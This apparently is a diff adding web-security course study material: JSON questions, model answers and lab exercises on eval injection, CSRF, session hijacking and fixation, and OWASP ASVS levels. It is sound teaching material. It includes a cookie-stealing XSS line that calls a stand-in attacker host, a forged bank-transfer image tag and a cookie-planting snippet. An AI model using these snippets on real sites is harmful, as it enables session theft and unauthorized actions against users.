+      "modelAnswer": "The vulnerability is command injection (in this case, code injection through Python's eval): the server takes two form parameters, a and b, and feeds them unvalidated into eval(f\"{a}+{b}\"). Because eval executes whatever Python expression it is given, an attacker can submit a value that is not a number at all but an arbitrary Python expression or statement — for example one that imports a module and calls os.system(...) — causing the server to execute attacker-chosen code with the privileges of the web process, far beyond just returning a wrong sum. This generalizes beyond Python: the slides note that almost every scripting language provides an eval-like construct, and 'command injection' broadly covers any situation where user-controlled input is passed to something that invokes another interpreter or shell (e.g. Python's os.system or subprocess.Popen, PHP's exec). The fix is to never call eval on untrusted input: instead use a proper, narrow API for the intended operation (e.g. explicitly parse and validate the two inputs as numbers and add them with '+', without invoking a general-purpose interpreter), escape/validate any data that genuinely must reach an external command, and, as defense in depth (not prevention), run any code that must execute externally in a low-privilege, sandboxed environment to limit the impact of an exploit.",
+      "citation": "presentation_2.pdf.extracted.txt, SLIDE 34",
+      "unverified": false,
+      "diagram_only": false
+    },
+    {
+      "id": "CYBER2-L2-17-m",
+      "anchorsExamQ": 2,
+      "anchorsSubPart": "b",
+      "type": "mechanism",
+      "question": "Explain the mechanism of a Cross-Site Request Forgery (CSRF) attack: why does the victim's browser send a forged, authenticated request without the user intending it?",
+      "keyBeats": [
+        "Victim is already authenticated to a target site (e.g. mybank.com) and holds a valid session cookie for it in their browser",
+        "Attacker gets the victim to load attacker-controlled content (e.g. a malicious page with <img src=\"https://www.mybank.com/transfer?amount=500&toaccount=iban\">), which causes the browser to issue a request to mybank.com as a side effect of just rendering the page",
+        "The browser automatically attaches mybank.com's cookies (including the session cookie) to that request, because from the browser's point of view it is simply 'a request to mybank.com', regardless of which page triggered it",
+        "The bank server sees a fully authenticated, well-formed request and has no way to tell it wasn't intentionally initiated by the logged-in user — this is the 'confused deputy' problem",
+        "State-changing requests (transfers, password changes) reachable via GET (or without any anti-forgery check) are especially exploitable this way, since a simple <img>/<a> tag is enough"
+      ],
+      "modelAnswer": "CSRF exploits the fact that browsers automatically attach a site's cookies to any request sent to that site, no matter which page triggered the request. If a victim is already logged into, say, mybank.com and holds a valid session cookie, an attacker can plant something like <img src=\"https://www.mybank.com/transfer?amount=500&toaccount=iban\"> on an unrelated page (or in an email). When the victim's browser loads that page, it tries to fetch the 'image' by sending a GET request to mybank.com — and because that request is going to mybank.com, the browser automatically includes the victim's mybank.com session cookie with it, exactly as it would for any legitimate request. From the bank server's perspective, this arrives as a fully authenticated request from the logged-in user, indistinguishable from one the user actually intended, so the transfer is processed. This is the 'confused deputy' problem: the server correctly verifies *who* the request claims to be from (via the cookie) but has no way to verify that the *user* actually intended to make that specific request. The attack is especially easy when a state-changing operation (like a funds transfer) can be triggered via a simple GET request, since that requires nothing more elaborate than an <img> or <a> tag to fire.",
+      "citation": "presentation_2.pdf.extracted.txt, SLIDE 113",
+      "unverified": false,
+      "diagram_only": true
+    },
+    {
+      "id": "CYBER2-L2-18-s",
+      "anchorsExamQ": 2,
+      "anchorsSubPart": "b",
+      "type": "specific",
+      "question": "Name and briefly explain the CSRF mitigations discussed in the lecture: Synchronizer Token, Double Submit Cookie, and SameSite cookies.",
+      "keyBeats": [
+        "Synchronizer Token: server generates a random, unpredictable token tied to the user's session, embeds it in the page (e.g. hidden form field or query parameter, NOT a cookie), and requires it to be resubmitted with the state-changing request; server compares it to the value stored server-side — an attacker's forged request can't include a token it never received (SOP prevents reading it cross-origin)",
+        "Double Submit Cookie: a random token is stored both in a cookie and expected again as a request parameter/header; the server checks the two match — a cross-site attacker's forged request will include the cookie automatically but cannot read the cookie's value (SOP) to also supply it as the matching parameter",
+        "SameSite cookie attribute: prevents the browser from even sending the session cookie on qualifying cross-site requests in the first place (Lax/Strict), which starves the attack of the cookie it needs to be treated as authenticated — but note Lax still allows the cookie on top-level GET navigations, so unsafe GET endpoints remain exposed",
+        "Other mitigations noted: re-authentication and CAPTCHA for especially sensitive operations",
+        "All rely on the attacker's page being unable to read something (a token/cookie value) that only same-origin JavaScript could access, thanks to the Same-Origin Policy"
+      ],
+      "modelAnswer": "The lecture lists several CSRF mitigations. The Synchronizer Token pattern has the server generate an unpredictable, session-bound token and hand it to the client (e.g. as a hidden form field), which must be sent back with any state-changing request; the server checks it against the value it stored for that session, and rejects the request if it's missing or wrong — a forged cross-site request can't include the correct token because the attacker's page has no way to read it. The Double Submit Cookie pattern instead stores the random token in a cookie and additionally requires it to be resubmitted as a separate request parameter or header; the server accepts the request only if the two match. A cross-site attacker's forged request will automatically carry the cookie (browsers always attach cookies), but because the Same-Origin Policy stops the attacker's script from reading the cookie's value, it cannot also supply the matching parameter, so the check fails. The SameSite cookie attribute takes a different approach: rather than validating a token, it stops the browser from ever sending the session cookie on qualifying cross-site requests (Strict blocks essentially all cross-site sends; Lax still allows it on top-level navigations like clicking a link, but not on background/subresource requests) — this starves a forged request of the authenticated cookie it needs to succeed, though state-changing operations reachable via a simple cross-site GET can still slip through Lax. For especially sensitive operations, the slides also mention re-authentication (asking for the password again) and CAPTCHA as additional (heavier, user-facing) defenses.",
+      "citation": "presentation_2.pdf.extracted.txt, SLIDE 119",
+      "unverified": false,
+      "diagram_only": false
+    },
+    {
+      "id": "CYBER2-L2-19-m",
+      "anchorsExamQ": 2,
+      "anchorsSubPart": "b",
+      "type": "mechanism",
+      "question": "How does a session hijacking attack work against 'classic' session tokens, and what combination of defenses prevents it?",
+      "keyBeats": [
+        "Session hijacking = the attacker obtains a copy of the victim's already-valid session token/cookie and replays it, so the server treats the attacker as the legitimate logged-in user",
+        "Route 1 (network sniffing): if the session cookie is sent over plaintext HTTP on a shared network, tools like Firesheep (2010) can passively capture cookies of other users on the same Wi-Fi and let the attacker 'become' them with a click",
+        "Route 2 (XSS): if an attacker can inject JavaScript (e.g. new Image().src = 'https://attacker.com/steal?cookie=' + document.cookie), the victim's own browser exfiltrates their session cookie to the attacker",
+        "Defense against Route 1: always send cookies over HTTPS (Set-Cookie: ...; Secure) so cookies are never exposed on the wire in plaintext",
+        "Defense against Route 2: deny JavaScript access to the cookie (Set-Cookie: ...; HttpOnly) and prevent XSS in the first place",
+        "Additional baseline defense: make session tokens sufficiently unpredictable (high entropy) so they cannot simply be guessed"
+      ],
+      "modelAnswer": "In session hijacking, the attacker does not need to guess or forge a session token — they capture a copy of a token the victim's browser is already legitimately using, and replay it to impersonate the victim. There are two common routes shown in the lecture. First, if the session cookie is transmitted over unencrypted HTTP on a shared network (e.g. public Wi-Fi), a passive sniffing tool like Firesheep (2010) can capture other users' session cookies and let the attacker take over their sessions with essentially one click. Second, if the site has an XSS vulnerability, the attacker can inject a script such as new Image().src = 'https://attacker.com/steal?cookie=' + document.cookie, which causes the victim's own browser to silently send their session cookie to the attacker's server. The corresponding defenses target each route: setting the Secure cookie attribute ensures the cookie is only ever sent over HTTPS, defeating network sniffing; setting the HttpOnly attribute denies JavaScript any access to the cookie via document.cookie, defeating the XSS-exfiltration route even if an XSS bug exists, while preventing XSS in the first place removes the root cause. As a baseline, session tokens must also be generated with enough entropy/unpredictability that an attacker cannot simply guess a valid one.",
+      "citation": "presentation_2.pdf.extracted.txt, SLIDE 89",
+      "unverified": false,
+      "diagram_only": false
+    },
+    {
+      "id": "CYBER2-L2-20-m",
+      "anchorsExamQ": 2,
+      "anchorsSubPart": "b",
+      "type": "mechanism",
+      "question": "How does a Session Fixation attack differ from Session Hijacking, and what is the underlying application flaw that enables it?",
+      "keyBeats": [
+        "Same end result as hijacking (attacker gains the rights of a logged-in user) but achieved differently: the attacker does not steal the victim's session — instead the attacker gets the victim to authenticate on a session the attacker already knows",
+        "Timeline: attacker obtains/establishes a session token BEFORE the victim ever logs in, then tricks the victim into using that specific token (e.g. via a crafted link, hidden form field, or injected cookie), and finally the victim logs in using that pre-known token",
+        "Once the victim authenticates, the server upgrades the *same* token to an authenticated state — but since the attacker already knew the token value from before login, the attacker can now use it too and is treated as the logged-in victim",
+        "Root cause: the vulnerable application accepts an externally-supplied session ID and/or does not issue a fresh, new session token upon successful authentication (does not regenerate the session ID at the moment privilege level changes)",
+        "Primary mitigation: always regenerate/reissue a brand-new, unpredictable session token immediately after authentication succeeds, invalidating whatever token was used pre-login"
+      ],
+      "modelAnswer": "Session Fixation produces the same outcome as session hijacking — the attacker ends up with the rights of the logged-in victim — but through a fundamentally different mechanism and timing. In hijacking, the attacker steals a token the victim is already using post-login. In fixation, the attacker does not need to steal anything: they instead establish or obtain a session token *before* the victim ever authenticates, then trick the victim into using that specific, attacker-known token (for example via a link containing the token as a URL parameter, a hidden form field, or by planting it as a cookie). When the victim subsequently logs in using that token, the vulnerable application simply upgrades the existing session to an authenticated state without issuing a new token — so the token the attacker already knew is now a valid, authenticated session, and the attacker can use it to access the victim's account. The underlying flaw is that the application either accepts a session ID supplied from outside (rather than always generating its own) and/or fails to regenerate the session ID at the moment the user's privilege level changes (i.e. upon login). The primary mitigation is therefore to always issue a fresh, unpredictable session token immediately after successful authentication and invalidate whatever token was in use beforehand, so a pre-login, attacker-known token can never become valid post-login.",
+      "citation": "presentation_2.pdf.extracted.txt, SLIDE 90",
+      "unverified": false,
+      "diagram_only": false
+    },
+    {
+      "id": "CYBER2-L2-21-s",
+      "anchorsExamQ": 2,
+      "anchorsSubPart": "b",
+      "type": "specific",
+      "question": "What techniques can an attacker use to 'pass' a fixed session token to a victim depending on where the token is kept (URL parameter, hidden form field, or cookie), and how should the application defend against each?",
+      "keyBeats": [
+        "Token in URL GET parameter: attacker sends the victim a link that already contains a valid session ID as a query parameter; the victim just needs to click it and the browser sends that session ID with the resulting request",
+        "Token in hidden form field: attacker hosts (or emails) a login form pre-populated with a known session token in a hidden field, which the victim's submission carries back to the real server",
+        "Token in cookie: attacker can plant/overwrite the cookie value directly, e.g. via a client-side script (XSS: document.cookie=...), a malicious <meta http-equiv=Set-Cookie> tag, or by manipulating an HTTP response (Set-Cookie header) if they can intercept traffic",
+        "Common defense across all three: never accept a session ID that was not generated by the server itself (reject externally-supplied session IDs — a 'strict' rather than 'permissive' session management mode), and always regenerate the session ID right after login regardless of what token was used before",
+        "Complementary defenses: keep session IDs only in cookies (not URL/hidden fields) marked Secure and HttpOnly to reduce the attack surface for planting/reading them"
+      ],
+      "modelAnswer": "The concrete fixation technique an attacker uses depends on where the application keeps the session token. If the token travels as a URL GET parameter, the attacker simply needs to get the victim to click a link that already embeds a known, valid session ID as a query parameter — the browser will send that value back to the server the moment the victim visits it. If the token is submitted via a hidden form field, the attacker can host a fake or copied login form (or embed it in an HTML email) that is pre-populated with a hidden field carrying the known token, so that once the victim fills in and submits their real credentials, the request still carries the attacker's chosen token value. If the token lives in a cookie, the attacker needs another way to write to the victim's browser's cookie store — for example via a client-side script if an XSS bug exists (document.cookie = 'sessionid=...'), via a malicious <meta http-equiv=Set-Cookie> tag, or by intercepting and modifying the server's HTTP response to inject a Set-Cookie header. Regardless of the delivery mechanism, the common structural defense is the same: the application should operate in 'strict' session management mode, meaning it never accepts a session ID it did not itself generate, and it must always issue and switch to a brand-new session ID immediately after successful authentication, so any pre-login token the attacker fixed becomes worthless the moment the victim logs in.",
+      "citation": "presentation_2.pdf.extracted.txt, SLIDE 98",
+      "unverified": false,
+      "diagram_only": false
+    },
+    {
+      "id": "CYBER2-L2-22-d",
+      "anchorsExamQ": 2,
+      "anchorsSubPart": "b",
+      "type": "definition",
+      "question": "What is the minimum recommended entropy for a session identifier, and why does this matter for preventing session guessing attacks?",
+      "keyBeats": [
+        "Session identifiers should have at least 64 bits of entropy to resist brute-force/guessing attacks",
+        "Entropy = amount of randomness/unpredictability; each additional bit doubles the number of possible values an attacker would have to search",
+        "IDs must be generated with a cryptographically secure pseudorandom number generator (CSPRNG) so the value space is evenly distributed — a weak/predictable generator effectively reduces the real entropy even if the ID string is long",
+        "Worked figure from the cheat sheet: with 64 bits of entropy, an attacker guessing 10,000 session IDs/second against 100,000 simultaneously valid sessions would need roughly 585 years on average to hit a valid one",
+        "Length alone is not the same as entropy — if part of the ID is fixed/predictable (e.g. a timestamp or username-derived prefix), the effective entropy (and thus security) is reduced even if the string looks long"
+      ],
+      "modelAnswer": "According to the OWASP Session Management guidance, session identifiers must have at least 64 bits of entropy to resist brute-force guessing. Entropy measures the amount of randomness/unpredictability in the value; each extra bit of entropy doubles the number of values an attacker would have to try, so a session ID with 64 bits of entropy has 2^64 possible values. To actually achieve that entropy, IDs must be produced with a cryptographically secure pseudorandom number generator (CSPRNG), because a weak or predictable generator can leave patterns in the output that reduce the effective entropy even when the ID string itself is long. As a concrete illustration, the cheat sheet notes that with 64 bits of entropy, an attacker who can try 10,000 guesses per second against an application with 100,000 simultaneously valid sessions would need on the order of 585 years on average to successfully guess a valid session ID. It's important to distinguish length from entropy: if part of a session ID is fixed or predictable (e.g. derived from a timestamp or username), the effective entropy is only as large as the truly random portion, so a long-looking ID can still be insecure if much of it is not actually random.",
+      "citation": "Session Management - OWASP Cheat Sheet Series.pdf.extracted.txt, PAGE 2",
+      "unverified": true,
+      "diagram_only": false
+    },
+    {
+      "id": "CYBER2-L2-23-o",
+      "anchorsExamQ": 2,
+      "anchorsSubPart": "c",
+      "type": "opener",
+      "question": "Why is the OWASP Top 10 alone insufficient as a development standard, and what is the OWASP ASVS meant to provide instead?",
+      "keyBeats": [
+        "OWASP Top 10 is explicitly described as an 'awareness document' — it helps argue that security needs attention and lists the most critical risk categories, but it is not detailed or actionable enough to build software against",
+        "It is 'hard to use as a development standard' — it names categories of risk (e.g. Injection, Broken Access Control) rather than giving concrete, checkable requirements",
+        "What's needed instead is a checklist that developers/testers can actually verify against, item by item",
+        "ASVS (Application Security Verification Standard) is developed specifically as a verification standard — a structured checklist for secure web development",
+        "ASVS is explicitly NOT a certification standard; organisations are expected to adopt/adapt it themselves based on a cost/benefit judgement rather than treat it as an externally awarded certificate"
+      ],
+      "modelAnswer": "The OWASP Top 10 is deliberately described as an awareness document: it lists the broad categories of the most critical web application security risks (Broken Access Control, Injection, Cryptographic Failures, and so on) and is effective for arguing to management or teams that security deserves attention. However, because it only names risk *categories* rather than giving concrete, testable requirements, it is hard to use directly as a development or verification standard — it doesn't tell a developer or auditor exactly what to check for in a given system. What is needed for actual engineering and verification work is a checklist: a structured list of specific, checkable requirements. This is precisely the role of the OWASP Application Security Verification Standard (ASVS): it is developed as a verification standard providing a checklist for secure web development, explicitly intended to help organisations both build and verify secure applications. Importantly, ASVS is not a certification standard — there is no official 'ASVS certified' badge awarded by OWASP; instead, organisations are expected to adopt and adapt ASVS to their own needs, weighing the cost of implementing/verifying each requirement against the benefit it provides for their particular risk profile.",
+      "citation": "presentation_2.pdf.extracted.txt, SLIDE 131",
+      "unverified": false,
+      "diagram_only": false
+    },
+    {
+      "id": "CYBER2-L2-24-d",
+      "anchorsExamQ": 2,
+      "anchorsSubPart": "c",
+      "type": "definition",
+      "question": "Describe the three ASVS Verification Levels: what does each one require, what threat is it aimed at, and what kind of application is it intended for?",
+      "keyBeats": [
+        "Level 1 ('First Steps, Automated'): the absolute minimal requirement, should/must be applied to any network-facing application; mitigates the OWASP Top 10; does not require source code access and has a high degree of automatable verification; aimed at threats like script-kiddies and drive-by/automated hacking; usage: baseline, legacy systems, low-value systems, or a first step toward higher levels",
+        "Level 2 ('Most Applications'): ensures relevant and effective security control mechanisms are actually in place and verifies both the presence and correct usage of those controls; aimed at motivated, skilled, and focused attackers; usage: applications handling sensitive data or business-critical functions",
+        "Level 3 ('High Value, High Assurance, High Safety'): ensures a secure, modular architecture (defense in depth) plus extensive non-technical controls such as security policies and documentation; aimed at advanced persistent threats (nation-state-sponsored attackers); usage: military, healthcare, critical infrastructure, and similarly high-stakes systems",
+        "Levels are cumulative in rigor: each higher level assumes a more capable/motivated attacker and layers on more (and more costly) verification requirements, not just 'more of the same'",
+        "The structure lets an organisation deliberately choose (cost/benefit) how much verification effort a given application warrants rather than applying a one-size-fits-all bar"
+      ],
+      "modelAnswer": "ASVS defines three Verification Levels of increasing rigor. Level 1 ('First Steps, Automated') is the absolute minimum requirement that should apply to any network-facing application; it is aimed at mitigating the risks in the OWASP Top 10, does not require access to source code, and can largely be verified through automated tooling. It targets low-sophistication threats such as script-kiddies and automated 'drive-by' hacking, and is appropriate as a baseline for legacy or low-value systems, or as a practical first step toward stronger levels. Level 2 ('Most Applications') goes further by verifying that relevant, effective security control mechanisms are not only present but actually used correctly; it is aimed at motivated, skilled, and focused attackers, and is the appropriate bar for applications handling sensitive data or business-critical functionality. Level 3 ('High Value Systems, High Assurance, High Safety') additionally requires a secure, modular architecture that provides defense in depth, along with extensive non-technical controls such as documented security policies; it is aimed at advanced persistent threats, i.e. well-resourced, potentially nation-state-sponsored attackers, and is intended for domains such as military, healthcare, and critical infrastructure systems. The levels are cumulative and increasingly costly to satisfy, which lets an organisation deliberately choose, based on the value of the system and the attackers it realistically faces, how much verification effort is justified rather than applying the same bar everywhere.",
+      "citation": "presentation_2.pdf.extracted.txt, SLIDE 136",
+      "unverified": false,
+      "diagram_only": false
+    },
+    {
+      "id": "CYBER2-L2-25-s",
+      "anchorsExamQ": 2,
+      "anchorsSubPart": "c",
+      "type": "specific",
+      "question": "Give one concrete example of an application that should be verified at ASVS Level 1, one at Level 2, and one at Level 3, and justify each choice.",
+      "keyBeats": [
+        "Level 1 example: a small personal blog or a legacy internal tool with no sensitive data — justification: it is still network-facing so needs a baseline against automated/opportunistic attacks (Top 10 coverage), but the low value of what's exposed doesn't justify the cost of deeper, manual verification",
+        "Level 2 example: an e-commerce site handling customer payment/personal data, or a company's business-critical CRM/ERP — justification: sensitive data and revenue-generating functions attract motivated, skilled attackers, so it's not enough that controls exist; the controls' effective, correct usage must actually be verified",
+        "Level 3 example: a hospital's patient record system, a power-grid SCADA control interface, or a military logistics application — justification: failure has safety/national-security consequences and the realistic threat includes advanced, well-resourced (potentially nation-state) attackers, which requires defense-in-depth architecture plus documented policies, not just technical controls",
+        "The classification is a cost/benefit judgement made by the organisation based on data sensitivity and attacker sophistication, not a fixed rule"
+      ],
+      "modelAnswer": "A small personal blog or an internal legacy tool that holds no sensitive data is a reasonable Level 1 example: it is still exposed to the network and so needs baseline protection against the OWASP Top 10 and automated/opportunistic ('script-kiddie') attacks, but the low value of what an attacker could obtain does not justify the cost of Level 2 or 3's deeper manual verification. An e-commerce platform that stores customer payment details and personal information, or an internal business-critical CRM/ERP system, fits Level 2: because it handles sensitive data and revenue-critical functions, it will attract motivated, skilled attackers, so it is not enough for security controls to merely exist — their correct, effective operation needs to be actively verified. A hospital patient-record system, a power-grid SCADA control interface, or a military logistics platform is a fitting Level 3 example: failures there have safety or national-security consequences, and the realistic threat model includes advanced, well-resourced, potentially nation-state-sponsored attackers, which is exactly what Level 3's requirement for a secure, defense-in-depth architecture and documented security policies (not just technical controls) is meant to address. In every case, the level chosen is a deliberate cost/benefit decision by the organisation based on the sensitivity of the data and the sophistication of the attackers it must realistically defend against, not an automatic classification.",
+      "citation": "presentation_2.pdf.extracted.txt, SLIDE 140",
+      "unverified": false,
+      "diagram_only": false
+    }
+  ],
+  "exercises": [
+    {
+      "id": "CYBER2-L2-E1",
+      "source": "activity - web.pdf.extracted.txt, PAGE 1 (Root Certificates)",
+      "promptVerbatim": "Answer the following questions about root certificates: 1. Where are the Root Certificates from recognized Certificate Authorities located on your computer? 2. How many root certificates are installed (on your computer)? 3. Use a text editor (like notepad, for example) to look at the contents of some of the certificates (don't edit!). How are they encoded? 4. Some are different lengths than others. Why is that? What algorithms are they used with?",
+      "whatItTests": "Understanding of the PKI trust anchor: that browsers/OS ship a local store of pre-trusted root CA certificates, that certificates are typically PEM/Base64 (or DER binary) encoded X.509 structures, and that certificate size varies with the public-key algorithm and key size used (e.g. RSA-2048 vs RSA-4096 vs ECDSA produce different certificate lengths). Directly reinforces the 'certificate chain of trust' mechanism from the lecture (subpart a/c).",
+      "answerSketch": "Root CA certificates live in an OS- or browser-specific trust store (e.g. the Windows/macOS system certificate store, or Firefox's own built-in store, accessible via browser settings > Privacy & Security > Certificates > View Certificates). The count varies by OS/browser but is typically on the order of 100+ trusted root CAs. Opened in a text editor, PEM-encoded certificates appear as Base64 text wrapped between -----BEGIN CERTIFICATE----- and -----END CERTIFICATE----- markers (some stores use binary DER format instead, which will look like unreadable binary). Differing lengths result from the public-key algorithm and key size embedded in the certificate: an RSA-4096 key produces a much larger certificate than an RSA-2048 or an elliptic-curve (ECDSA, e.g. P-256) key, since larger/RSA keys require more bytes than the more compact elliptic-curve keys for a comparable security level."
+    },
+    {
+      "id": "CYBER2-L2-E2",
+      "source": "activity - web.pdf.extracted.txt, PAGE 1 (Developer Console)",
+      "promptVerbatim": "Open https://aau.dk/ and the developer console in your web browser. Then answer the following questions. 1. Use the network tab to look at the requests sent when you reload the page. What is the response code from https://aau.dk/? 2. Go to the JavaScript console and examine the value of window.navigator.userAgent; by running it as a command. What does it tell you? 3. Now examine only window.navigator; in the same way. You might need to click something to expand the display to see all the properties. What are some surprising things contained within?",
+      "whatItTests": "Practical familiarity with HTTP response codes (2XX/3XX ranges) and with what information a browser voluntarily discloses to any website via the navigator object (browser/OS/version fingerprinting data, language, plugins, hardware concurrency, geolocation API availability, etc.) — connects directly to the HTTP response-code taxonomy and 'client-side scripting has limited but real access to information' themes from the lecture.",
+      "answerSketch": "The initial request to https://aau.dk/ commonly returns a 200 OK (or a 3XX redirect, e.g. to a language-specific or HTTPS-canonical URL, followed by a 200). window.navigator.userAgent returns a single string identifying the browser engine, version, and OS (e.g. 'Mozilla/5.0 (Windows NT ...) AppleWebKit/... Chrome/... Safari/...'), which any website can read for basic fingerprinting/compatibility checks. Expanding window.navigator reveals many more properties beyond the user agent — e.g. language/languages, hardwareConcurrency (CPU core count), platform, cookieEnabled, onLine, plugins/mimeTypes, geolocation and mediaDevices APIs, deviceMemory in some browsers — illustrating that a surprising amount of device/environment information is exposed to any page's JavaScript by default, which matters for both privacy and fingerprinting-based attacks."
+    },
+    {
+      "id": "CYBER2-L2-E3",
+      "source": "activity - web.pdf.extracted.txt, PAGE 1-2 (Response Codes)",
+      "promptVerbatim": "If you don't have it already, install Curl. Now use it to see how many different response codes you can find. You may have to explore sending different parameters. On Linux/OS X use commands like: curl -s -D - -o /dev/null http://google.ca ... Here are a few useful ones: -X Method (uses the specified HTTP request method), -d \"param1=value1&param2=value2\" (sets request body), -H \"Header: Value\" (sets a header)",
+      "whatItTests": "Hands-on understanding of the HTTP response status-code classes (1XX/2XX/3XX/4XX/5XX) and of how request method, body, and headers (-X, -d, -H) shape a request — reinforces the lecture's HTTP request/response structure and status-code taxonomy (subpart a).",
+      "answerSketch": "Using curl -s -D - -o /dev/null <url> with varying flags typically surfaces: 200 OK for a normal successful GET; 301/302 (or 308/307) for sites that redirect http->https or to a canonical URL; 404 Not Found for a nonexistent path; 405 Method Not Allowed when using -X with an unsupported verb on an endpoint; 400 Bad Request when sending a malformed -d body or missing required parameters; and possibly 403 Forbidden for access-restricted resources. The exercise reinforces that the response code's first digit indicates its class (1XX informational, 2XX success, 3XX redirection, 4XX client error, 5XX server error) exactly as covered in the HTTP Response Code slide."
+    }
+  ]
+}
